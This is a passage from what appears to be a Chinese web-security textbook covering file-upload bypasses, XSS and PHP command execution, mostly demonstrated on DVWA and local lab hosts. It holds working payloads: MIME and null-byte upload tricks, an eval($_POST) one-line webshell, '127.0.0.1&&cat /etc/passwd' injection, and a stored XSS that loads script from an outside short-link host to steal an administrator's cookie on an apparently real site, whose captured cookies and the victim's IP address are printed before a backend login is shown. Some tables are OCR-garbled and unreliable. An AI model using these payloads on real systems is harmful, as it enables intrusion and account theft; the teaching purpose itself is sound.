MIME 类型用来设定某种扩展名文件的打开方式，当具有该扩展名的文件被访问时，浏览器会自动使用指定的应用程序来打开。如 GIF 图片 MIME 为 image/gif, CSS 文件 MIME 类型为 text/css。上传时，程序开发人员经常会对文件 MIME 类型做验证。

上传 ASP 文件时，使用 Burp Suite 拦截查看 MIME 类型，可以发现 ASP 文件的 MIME 类型为 application/octet-stream，如图 6-4 所示。


图 6-4 修改 MIME 类型



而在服务器端中会判断文件类型是否为 image/gif，显然这里无法通过验证。



将在 HTTP 请求中的 Content-Type 更改为 image/gif 类型，这样即可通过程序验证，如图 6-5 所示。


<table><tr><td colspan="4">st</td><td colspan="3">Response</td></tr><tr><td>Params</td><td>Headers</td><td>Hex</td><td></td><td>P-;</td><td>Headers</td><td>Hex</td></tr><tr><td rowspan="2" colspan="4">ext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
language: zh-cn
ncoding: gzip, deflate
http://localhost/upload/upload2.php
on: keep-alive
Type: multipart/form-data; boundary=-----207301453325388
Length: 1290
-----207301453325388
Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1ksmall2.asp&quot;
Type: image/gif</td><td colspan="3">HTTP/1.1 200 OK
Date: Sun, 26 Jan 2014 08:40:34 GMT
Server: Apache/2.2.22 (Win32) PHP/5.3.13
X-Powered-By: PHP/5.3.13
Content-Length: 680
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html</td></tr><tr><td colspan="3">文件上传成功，保存于：uploads/1ksmall2.asp
&lt;!DOCTYPE html PUBLIC *-/!V3C//DTD XHTML*http://www3.org/TR/xhtml1/DTD/xhtml1</td></tr></table>


图6-5 上传成功


## 3. 目录验证

在文件上传时，程序通常允许用户将文件放到指定的目录中，然而有些 Web 开发人员为了让代码更“健壮”，通常会做一个操作，若指定的目录存在，就将文件写入目录中，若目录不存在，则先建立目录，然后写入。

在 HTML 代码中有一个隐藏标签:

```txt
<input type="hidden"name="Extension" value="up"/> 
```

这是文件上传时默认的文件夹，此参数是可控的，例如，使用 FireBug 将 Value 值改为 pentest.asp，并上传图片木马文件。程序在接收到文件后，对目录进行判断，若服务器不存在 pentest.asp 目录，将会建立此目录，然后再将图片木马文件写入 pentest.asp 目录，若 Web 容器为 IIS 6.0，那么网页木马会被解析。

## 4. 截断上传攻击

例如，1.php.jpg（.asp后面为0×00），在判断时，大多函数取后缀名是从后往前取，故能够通过，但是在保存时，却被保存为1.php。可以发现，%00将后面的字符都截断了，这就是截断攻击的原型。攻击时，通过代理拦截请求，将文件上传名称更改为“1.php 空格.jpg”，然后单击 hex 选项卡进入十六进制编辑模式，将文件名中空格的十六进制数改为 00，即 NULL，如图 6-6 所示。单击 GO 按钮，可以发现最终上传的文件为 1.php，1.php 后面的字符已经被截断。

<table><tr><td>70</td><td></td><td>0d</td><td>0a</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>jpg</td></tr><tr><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td>2d</td><td></td></tr><tr><td>2d</td><td>36</td><td>34</td><td>38</td><td>31</td><td>30</td><td>37</td><td>32</td><td>37</td><td>34</td><td>37</td><td>32</td><td>0d</td><td>0a</td><td>43</td><td>-648107274720</td></tr><tr><td>50</td><td>74</td><td>65</td><td>6e</td><td>74</td><td>2d</td><td>44</td><td>69</td><td>73</td><td>70</td><td>6f</td><td>73</td><td>69</td><td>74</td><td>69</td><td>orient-Disposito</td></tr><tr><td>6e</td><td>3a</td><td>20</td><td>60</td><td>6f</td><td>72</td><td>6d</td><td>2d</td><td>64</td><td>61</td><td>74</td><td>61</td><td>3b</td><td>20</td><td>6e</td><td>out form-data; n</td></tr><tr><td>5d</td><td>65</td><td>3d</td><td>22</td><td>61</td><td>74</td><td>74</td><td>61</td><td>63</td><td>68</td><td>50</td><td>61</td><td>74</td><td>68</td><td>22</td><td></td></tr><tr><td>0a</td><td>0d</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table>


图 6-6 修改截断字符


截断上传的问题也存在于在 ASP、JSP 程序中。

## 6.4 实战操作

本节通过实战操作介绍文件上传漏洞的利用。

案例：

目标网站：127.0.0.1。

被攻击原因：存在文件上传漏洞。

详细操作流程请参考第 6 章视频 6-1、6-2 和 6-3。

# XSS 跨站脚本漏洞

XSS 跨站脚本攻击是客户端 Web 安全中最主流的攻击方式。Web 环境的复杂性及 XSS 跨站脚本攻击的多变性，使得该类型攻击很难彻底解决。究竟什么是 XSS 跨站脚本攻击，具体攻击行为又是什么，本章对此进行了简要分析。

## 7.1 XSS 原理解析

跨站脚本漏洞（Cross Site Scripting）缩写为 CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，因此跨站脚本攻击缩写为 XSS。跨站脚本漏洞是 Web 应用程序在将数据输出到网页时存在问题，导致恶意攻击者可以往 Web 页面里插入恶意 JavaScript、HTML 代码，并将构造的恶意数据显示在页面的漏洞。

跨站脚本漏洞是在客户端发动造成攻击，插入的恶意代码是在浏览器中运行的。

## “微博病毒”攻击事件

2011 年 6 月 28 日晚，某微博遭遇到 XSS 蠕虫攻击侵袭，微博用户中毒后，会自动通过发微博和私信的方式将 XSS 蠕虫信息对外传播，发布带有恶意脚本的链接地址，当用户的粉丝点击带有恶意脚本的链接后就会再次中毒，进而形成恶性循环。其中众多加 V 认证的用户受到感染，当此类用户发布相关微博和私信内容后，蠕虫的传播将变得更为广泛，影响也更为严重。在不到一个小时内，超过三万的微博用户受到病毒感染。

这是由于某微博名人堂部分 XSS 过滤不严所致，并可以通过构造脚本的方式植入恶意代码，使得黑客可以构造任意 JavaScript 脚本嵌入到存在漏洞的页面中，通过 Ajax 技术完全实现异步提交数据的功能，让黑客通过构造的 JavaScript 代码使受到 XSS 蠕虫攻击的客户自动发微博、添加关注和发私信等。

一般来说，跨站脚本攻击漏洞（XSS）并不会对用户的计算机造成损害，也不会对 Web 应用程序服务器直接造成破坏，攻击者的主要目的是窃取用户 Cookie，盗取用户账户，修改用户设置做虚假广告等。XSS 攻击涉及三方面，分别为攻击者、被攻击者（网页浏览者）、和存在漏洞的网站。其中，网站只是攻击者进行攻击的一个载体，本身基本不会受到影响，只有被攻击者会实际运行攻击者的代码。

这类攻击可能产生以下几种危害：账户失窃；数据信息被读取、篡改、添加或者删除；非法转账；强制发送电子邮件；受控向其他网站发起攻击等。

## 7.2 XSS 类型

XSS 有以下 3 种类型。

持久型跨站漏洞：又称存储型跨站脚本漏洞。将跨站代码存储在服务器中（数据库），使得访问该页面的用户都面临信息泄漏的可能，例如，论坛发帖或留言处的 XSS 就是持久型的 XSS，存储在数据库。

○ 非持久型跨站漏洞：又称反射型跨站脚本漏洞。用户访问服务器，点击了跨站链接，将返回跨站代码（需要欺骗用户自己去点击链接才能触发 XSS）。

- DOM（document object model，文档对象模型）跨站漏洞（DOM XSS）：客户端脚本处理逻辑导致的安全问题。简单来说，基于DOM的跨站脚本漏洞就是出现在JavaScript代码中的漏洞。

## 7.2.1 反射型 XSS

非持久型跨站脚本攻击漏洞（反射型）：

反射型 XSS 的利用一般是攻击者通过特定的手法（例如，电子邮件），诱导用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的恶意链接时，恶意的 JavaScript 代码会直接在受害者主机的浏览器上执行。其特点是用户点击时触发，而且只执行一次，非持久化，所以称为反射型跨站脚本攻击漏洞。

如下测试网站，并在 URL 中插入恶意 JavaScript 代码：

```html
http://127.0.0.1/achievement/nuclear.php?page=1%22%3E%3Cscript%3Ealert(1)%3C/script%3E 
```

单击出现如图 7-1 所示弹窗。

![image](MinerU_markdown_Web安全基础教程_assets/image_0054_9b308b9a424b.jpg)



图 7-1 反射型跨站弹窗


反射型 XSS 的危害不如持久型的 XSS，因为恶意代码暴露在 URL 参数中，用户必须点击才能触发，只要稍微有点安全意识的用户都可以轻易看出这个链接是不可信的，所以反射型 XSS 要更浪费成本。

## 7.2.2 存储型 XSS

持久型跨站脚本攻击漏洞（存储型）：

此类 XSS 不需要用户点击特定的 URL 就能执行跨站脚本, 攻击者事先将恶意 JavaScript 代码上传或者存储到漏洞服务器中, 只要受害者浏览包含此恶意 JavaScript 代码的页面就会执行恶意代码。

首先找了一个存有 XSS 漏洞的网站，注册一个域名，然后在“有问必答”模块下插入 XSS 代码<script src=http://t.cn/RqJeHbi></script>，如图 7-2 所示，接下来就等待管理员回复触发，如图 7-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0055_e2cae1267578.jpg)



图 7-2 插入 XSS 恶意代码


![image](MinerU_markdown_Web安全基础教程_assets/image_0056_6e5dd310463f.jpg)



图 7-3 查看 XSS 代码信息


根据图 7-4 所示，管理员已回复留言，接下来尝试获取管理员的 Cookie 信息。

<table><tr><td>·location: http://private.huyi.top/SetInManager/csquestion/detail.asp?q_id=20061
·toplocation:http://private.huyi.top/SetInManager/csquestion/detail.asp?q_id=20061
·cookie:pgv_pvi=6783630336;bdshare_firstime=1463383186785;ASPSESSIONIDCQATQSAT=LEKLGBNBPDJDBKODMKPDEIBB;IESESSION=alive;pgv_s i=s3695651840;_qddab=3-xazqrk.ioc54 af7;ASPSESSIONIDCSASRSBS=PALNOBICALMDDABCNIDDHDMO;Hm_lvt_1 254a95eb5ae681e008c73311999b4f 6=1463186052,1463358525,14634453 01,1463531859;Hm_lpvt_1254a95eb5 ae681e008c73311999b4f6=146361832</td><td>·HTTP_REFERER p/SetInManager/csquestion/detail.asp? q_id=20061
·HTTP_USER_AGENT:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53 7.36 (KHTML, like Gecko) Chrome/4 3.0.2357.132 Safari/537.36
·REMOTE_ADDR:121.229.12.59,121.2 29.12.59
·IP_ADDRESS:江苏省南京市-电信</td></tr></table>


图 7-4 获取管理员 Cookie 信息



已经成功获取到管理员 Cookie 信息，此时可尝试登录网站后台，如图 7-5 所示。


<table><tr><td>列表</td><td>·新注册</td><td colspan="4">快捷链接：智能建站标准建站-标准标准建站-高级云享主机</td></tr><tr><td>管理</td><td>·入账</td><td rowspan="5" colspan="2">◎开设○购买○试用
○过期○过15天○删除○一个月内到期</td><td rowspan="5" colspan="2">按主机名称查询</td></tr><tr><td>域名优惠券</td><td>·产品转移记录</td></tr><tr><td>管理</td><td>·虚拟主机管理</td></tr><tr><td>管理</td><td>·云主机管理</td></tr><tr><td>管理</td><td></td></tr><tr><td>库管理</td><td>·短信套餐</td><td rowspan="3" colspan="2">hongyi
2013
U621号</td><td rowspan="2">222.186.191.70</td><td rowspan="2"></td></tr><tr><td>平台管理</td><td>·通用网址管理</td></tr><tr><td>订单管理</td><td>·备查发布管理</td><td>222.186.191.104</td><td></td></tr><tr><td>电话管理</td><td></td><td colspan="2">beifen
ww.hcm</td><td>222.186.191.104</td><td></td></tr><tr><td>车管理</td><td></td><td colspan="2">jzjygi
CP官
05号
mm
CP
05号</td><td>222.186.191.104</td><td></td></tr><tr><td>档案</td><td>·续费通知</td><td rowspan="2" colspan="2">shggb
om
30
183号</td><td rowspan="2">222.186.9.2</td><td rowspan="2"></td></tr><tr><td>级别</td><td>·薪发通知</td></tr></table>


图 7-5 成功登录网站后台


## 7.3 实战操作

本小节通过 DVWA 中 XSS 漏洞模块进行一次实战操作演示。详细操作流程请参考第 7 章视频 7-1。

进入 DVWA 漏洞演示平台，选择 XSS 漏洞模块（XSS reflected）。根据提示，在文本框中输入一句 XSS 语句：/><script>alert(/xss/)</script>，如图 7-6 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0057_c5d0fa0c53b8.jpg)



图 7-6 编辑 XSS 语句


编写好语句后确认，查看是否可以成功显示弹窗，如图 7-7 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0058_0f6311158bbc.jpg)



图 7-7 反射型 XSS


进入 DVWA 漏洞演示平台，选择 XSS 漏洞模块（XSS stored）。

根据提示，在 Name 文本框中随意插入语句，在 Message 文本框中输入一句 XSS 语句： <|script>alert(/你中毒了/)</script>，如图 7-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0059_3f817c167fb8.jpg)



图 7-8 编辑 XSS 语句


再次进入 XSS 漏洞模块（XSS stored）时，就会弹出上次写好的 XSS 语句，如图 7-9 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0060_7dedf5f6852a.jpg)



图 7-9 存储型 XSS


改变语句，获取 Cookie，如图 7-10 所示。语句如下：

```html
/<script>alert(documen.cookie)</script> 
```

![image](MinerU_markdown_Web安全基础教程_assets/image_0061_d9d16ced068e.jpg)



图 7-10 获取 Cookie


# 命令执行漏洞

远程命令执行漏洞，攻击方式灵活，且攻击成功后一般返回继承了 Web 组件（如 Apache, Weblogic, Tomcat 等）权限的 Shell，危害相当严重。

命令执行漏洞涉及很多方面，大致可分为以下几类：

网站应用，如用 ASP，JSP，PHP 编写的网站，没有对其使用的一些函数进行过滤，导致远程代码执行。

○ Web 服务中间件，如 Jboss, WebLogic, Tomcat 等负责提供解析网站程序的容器。

○ 数据库，提供数据存储的 SQL Server，MySQL，Oracle 等。

客户端应用程序，即需要在用户主机上进行安装的客户端程序，如浏览器，APK 程序等。

- 操作系统端，如 Linux，Windows 自身系统中存在的漏洞缺陷，没有合理地处理空指针，导致存在溢出，执行远程命令。

本章只介绍 Web 应用中存在的命令执行漏洞。

由于开发人员在编写代码时没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句，并交由服务器端执行。命令注入攻击中 Web 服务器没有过滤类似 system()、eval()、exec() 的函数，是该漏洞攻击成功的最主要原因。

## 8.1 命令执行漏洞示例

DVWA（Dam Vulnerable Web Application）是用 PHP+MySQL 编写的一套用于常规 Web 漏洞教学和检测 Web 脆弱性的测试程序，包含了 SQL 注入、XSS、命令执行等常见的一些安全漏洞，如图 8-1 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0062_a20c36701fa9.jpg)



图 8-1 DVMA 界面


本节将使用这个平台来演示远程命令执行漏洞，首先进入 Command Execution 模块，在这个模块中，提供了一个可以测试网络连通性的 Ping 服务（命令执行漏洞测试模块），并可通过界面将 Ping 命令测试过程显示出来。

Ping 是潜水艇人员的专用术语，表示回应的声纳脉冲，在网络中 Ping 是一个十分好用的 TCP/IP 工具，其主要功能是用来检测网络的连通情况和分析网络速度。

首先要了解 Ping 的一些参数和返回信息。

打开 DOS 命令界面。选择开始菜单中的 “运行” 命令，输入 cmd，按 Enter 键即可打开，如图 8-2 和图 8-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0063_085fd9212ee4.jpg)



图 8-2 DOS 命令界面


![image](MinerU_markdown_Web安全基础教程_assets/image_0064_166292b68e9a.jpg)



图 8-3 进入 DOS 命令


使用 ping / 命令可查看 Ping 命令的帮助信息，如图 8-4 所示。

<table><tr><td colspan="2">C:\Users\joc&gt;ping /?</td></tr><tr><td colspan="2">用法: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v IOS]
    [-r count] [-s count] [[-j host-list] ! [-k host-list]]
    [-w timeout] [-R] [-S crcaddr] [-4] [-6] target_name</td></tr><tr><td>选项:
-t</td><td>Ping 指定的主机,直到停止。
若要查看统计信息并继续操作 - 请键入 Control-Break
若要停止 - 请键入 Control-C。
将地址解析成主机名。
要发送的回显请求数。
发送缓冲区大小。
在数据包中设置“不分段”标志(仅适用于 IPv4)。
生存时间。
服务类型(仅适用于 IPv4。该设置已不赞成使用,且对 IP 标头中的服务字段类型没有任何影响)。</td></tr><tr><td>-a</td><td rowspan="11">记录计数跃点的路由(仅适用于 IPv4)。
计数跃点的时间戳(仅适用于 IPv4)。
与主机列表一起的松散源路由(仅适用于 IPv4)。
与主机列表一起的严格源路由(仅适用于 IPv4)。</td></tr><tr><td>-n count</td></tr><tr><td>-l size</td></tr><tr><td>-f</td></tr><tr><td>-i TTL</td></tr><tr><td>-v IOS</td></tr><tr><td>-r count</td></tr><tr><td>-s count</td></tr><tr><td>-j host-list</td></tr><tr><td>-k host-list</td></tr><tr><td>-w timeout</td></tr><tr><td>-R</td><td>同样使用路由标头测试反向路由(仅适用于 IPv6)。</td></tr><tr><td>-S srcaddr</td><td>要使用的源地址。</td></tr><tr><td>-4</td><td>强制使用 IPv4。</td></tr><tr><td>-6</td><td>强制使用 IPv6。</td></tr></table>


图 8-4 查看 Ping 命令帮助文档


怎样使用 Ping 命令来测试网络连通呢？

连通问题是由许多原因引起的，如本地配置错误、远程主机协议失效等，当然还包括设备等造成的故障。ping 127.0.0.1（127.0.0.1 为回送地址），若本地址无法 Ping 通，则表明本地机器 TCP/IP 协议不能正常工作，如图 8-5 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0065_fe143ba53dd1.jpg)



图8-5 Ping本地


Ping 本地局域网内主机 IP 地址，如图 8-6 所示，这样是为了检查本机的 IP 地址是否设置有误。

![image](MinerU_markdown_Web安全基础教程_assets/image_0066_175641a10eb4.jpg)



图 8-6 Ping 本地局域网内主机 IP 地址


Ping 本网网关或本网 IP 地址，如图 8-7 所示，这样是为了检查硬件设备是否有问题，也可以检查本机与本地网络连接是否正常（在非局域网中这一步骤可以忽略）。

![image](MinerU_markdown_Web安全基础教程_assets/image_0067_341bf4e30ae6.jpg)



图 8-7 Ping 本地网关


Ping 远程 IP 地址，如图 8-8 所示，这主要是为了检查本网或本机与外部的连接是否正常。

![image](MinerU_markdown_Web安全基础教程_assets/image_0068_e229c9170938.jpg)



图 8-8 Ping 远程 IP 地址


了解了 Ping 命令的基本用法之后，可以在 command execution 模块中来测试这个远程命令执行漏洞。

当输入一个 IP 地址之后，单击 submit 按钮，可以看到有返回数据，其中发送 3 个数据包，返回 3 个数据包，数据包没有丢失，说明本机 TCP/IP 协议正常通信，说明这个模块的功能可以正常使用，如图 8-9 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0069_bfab3f980ad4.jpg)



图 8-9 Ping 本地 IP


查看模块源代码时发现如图 8-10 所示的情况。

<table><tr><td>&lt;?php
if( isset($_POST[&#x27;submit&#x27;]) {</td><td></td></tr><tr><td></td><td>$target = $_REQUEST[&#x27;ip&#x27;] ;</td></tr><tr><td></td><td>// Determine OS and execute the ping command.
if (stristr(php_uname(&#x27;s&#x27;), &#x27;Windows NT&#x27;)) {</td></tr><tr><td></td><td>$cmd = shell_exec(&#x27;ping&#x27; . $target; echo &#x27;&lt;pre&gt;&#x27;.$cmd.&#x27;&lt;/pre&#x27;&gt;;</td></tr><tr><td></td><td>} else {</td></tr><tr><td></td><td>$cmd = shell_exec(&#x27;ping -c 3&#x27; . $target); echo &#x27;&lt;pre&gt;&#x27;.$cmd.&#x27;&lt;/pre&#x27;&gt;;</td></tr><tr><td></td><td>}</td></tr><tr><td colspan="2">}</td></tr><tr><td colspan="2">?&gt;</td></tr></table>


图8-10 源码中的target参数


shell_exec()函数可以调用操作系统命令，返回多行数据，$target 参数也没有进行有效性检查，在 Windows 或 Linux 操作系统中可以使用"&&""|""||"; ""&"等连接符，在一个命令行中执行多条命令。

○ A && B: 先执行命令 A，成功之后再执行命令 B。

○ A||B：表示先执行命令 A，不成功再执行命令 B，若命令 A 执行成功，则不再执行命令 B。

执行效果如图 8-11 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0070_d31a3921c489.jpg)



图 8-11 命令执行


在知道了系统命令可以连接执行之后，若 Web 应用程序没有过滤好输入，就变得相当危险，在应用程序运行权限非常高的情况下，服务器可被轻易获取权限。

在 Command Excution 模块中，输入 127.0.0.1&&Command，系统将会执行输入的

Command 命令，这就是命令执行漏洞，如图 8-12 所示。


Vulnerability: Command Execution


```txt
Ping for FREE
Enter an IP address below:
127.0.0.1&&cat /etc/passwd submit
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.038 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.026 ms
-- 127.0.0.1 ping statistics --
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 0.025/0.029/0.038/0.008 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh 
```


图 8-12 命令执行漏洞


## 8.2 命令执行模型

任何脚本语言都可以通过相应的函数调用操作系统命令，而各个脚本语言的实现方式都不一样，接下来将以 PHP 程序语言为例进行分析。

PHP 提供了部分函数用来执行外部应用程序，例如，system()，shell_exec()，exec()和passthru()。

案例一：命令执行

新建一个 cmd.php 文件，输入如图 8-13 所示的内容。

![image](MinerU_markdown_Web安全基础教程_assets/image_0071_92a9f6674f75.jpg)



图8-13 新建PHP文件


在 Linux 环境中使用 PHP 程序解析文件，在 Host 参数中添加 “&&” 执行系统命令，

如图 8-14 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0072_4920faae1c91.jpg)



图 8-14 执行系统命令


## 案例二：代码执行

PHP 中提供了一个 eval() 的函数，“中国菜刀”中的 PHP 客户端就使用了这个函数：

```php
<?php eval($_POST['x'])?> 
```

eval()函数可以把字符串按照 PHP 代码来执行，换句话说，就是可以动态地执行 PHP 代码，使用 eval()函数时需要注意的是：输入的字符串必须是合法的 PHP 代码，且必须以分号结尾。

cmd.php 中存在以下代码，如图 8-15 所示。

```php
<?phpeval($_POST[cmd]);?> 
```

![image](MinerU_markdown_Web安全基础教程_assets/image_0073_af0490e0b936.jpg)



图8-15 PHP一句话


使用相关的连接工具，可以成功获取系统权限，如图 8-16 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0074_2f4c299d1fd2.jpg)



图 8-16 获取系统权限


## 案例三：动态函数调用

PHP 支持动态函数调用，代码如图 8-17 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0075_829a09b52dbb.jpg)



图8-17 动态函数调用



PHP 解释器可以根据$fun()函数值来调用对应的函数,当变量$fun 的值为 A 时,那么 $fun()对应的函数为 A(),虽然这样给开发带来了极大的便利,但却存在安全隐患,输入 URL: http://10.10.10.133/cmd2.php?fun=phpinfo, 当$fun()值为 phpinfo 时,$fun()函数对应的函数即为 phpinfo()。访问此链接即可打印 phpinfo 页面,如图 8-18 所示。


<table><tr><td colspan="2">10.10.10.133/cmd2.php?fun=phpinfo</td></tr><tr><td></td><td></td></tr><tr><td>System</td><td>Linux moterploitable 2.8.24-16-server CI SIF The Apy 10 13:50:00 UTC 2003 1965</td></tr><tr><td>Build Date</td><td>Jan 5 2010 21:50:12</td></tr><tr><td>Save API</td><td>CGI/PostCGI</td></tr><tr><td>Virtual Directory Support</td><td>disabled</td></tr><tr><td>Configuration File (ip, ini) Path</td><td>/etc/php5/cgi</td></tr><tr><td>Loaded Configuration File</td><td>/etc/php5/cgi/php.ini</td></tr><tr><td>See this dir for additional init files</td><td>/etc/php5/cgi/conf.d</td></tr><tr><td>Additional init files parsed</td><td>/etc/php5/cgi/conf.d/gd.ini, /etc/php5/cgi/conf.d/pyqcl.ini, /etc/php5/cgi/conf.d/pydo.ini, /etc/php5/cgi/conf.d/pda_hynql.ini</td></tr><tr><td>IP Art</td><td>20011225</td></tr><tr><td>Zo J Atosia</td><td>20060813</td></tr><tr><td>ZoJ Atosia</td><td>220030519</td></tr><tr><td>Delac Pila</td><td>no</td></tr><tr><td>Travel Safety</td><td>dischled</td></tr><tr><td>Zed Carry</td><td>onobled</td></tr></table>


图8-18 phpinfo页面



可能有些读者会认为最多能执行一个 phpinfo，并没有太大影响，这样的想法是错误的。例如，程序员还想给函数传递参数，代码可能如图 8-19 所示。


<table><tr><td>-&lt;?php
	\$fun=\$_GET[&#x27;fun&#x27;]; 
	\$par=\$_GET[&#x27;par&#x27;]; 
	\$fun(\$par);        //执行函数：并且使用参数
?&gt;</td></tr></table>


图 8-19 使用参数执行函数


当用户提交的 URL 为 http://10.10.10.133/system.php?fun=system&par=cat/etc/passwd 时，最终执行函数为 system('cat/etc/passwd')，这样就存在了远程命令执行漏洞，如图 8-20 所示。

<table><tr><td>← C 10.10.10.133/system.php?fun=system&amp;par=cat%20/etc/passwd ☆ 小 随</td></tr><tr><td>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh data:x:33:33:data:/var/nobin/sh
backup:x:34:34:backup:/var/backup:/bin/sh list:x:38:38:Hailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL
administrator,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:\MySQL Server,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a
user,111,,:/home/user:/bin/bash service:x:1002:1002,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false snmp:x:115:65534::/var/lib/snmp:/bin/false</td></tr></table>


图 8-20 获取 etc/passwd 信息



案例四：PHP 函数代码执行漏洞



在 PHP 中，代码执行漏洞出现较多，像 preg_replace()、ob_start()、array_map() 等函数都存在代码执行的问题，在此以 array_map() 函数为例说明，代码如图 8-21 所示。


<table><tr><td>&lt;?php
	\$arr=\$_GET[&#x27;arr&#x27;]; 
	\$array=array(1,2,3,4,5); 
	\$new_array=array_map(\$arr,$array);</td></tr><tr><td>?&gt;</td></tr></table>


图 8-21 array_map()函数



array_map()函数的作用是返回用户自定义函数处理后的数组，现在输入 http://10.10.10.133/array_map.php?arr=phpinfo 后，发现 phpinfo 代码已经被执行，如图 8-22 所示。


<table><tr><td colspan="2">10.10.10.133/array_map.php?arr=phpinfo</td></tr><tr><td></td><td></td></tr><tr><td>System</td><td>Li==e#(c#p#ch(d^L, 2,6,###)##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-##-</td></tr><tr><td>E=I&amp;E=I</td><td>E=C(### 21:59):2</td></tr><tr><td>C=I+D=I</td><td>C(I/7:10X)</td></tr><tr><td>Virt=I D=I</td><td>Jnble!</td></tr><tr><td>C=I+D-E=C(I) (i=I,i=I)</td><td>/(c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#/c#</td></tr><tr><td>L=I</td><td>/(t=c/#-5/#/a/n/r&#x27;) =</td></tr><tr><td>C=f=G-I(n)</td><td>/(t=c/#-5/#/a/n/r&#x27;) =</td></tr><tr><td>E=C(I)=I(E=I) (i=I,i=I)</td><td>/(t=c/#-5/#/a/n/r&#x27;) =</td></tr><tr><td>C#(i=I,i=I) (i=I,i=I)</td><td>/(t=c/#-5/#/a/n/r&#x27;) 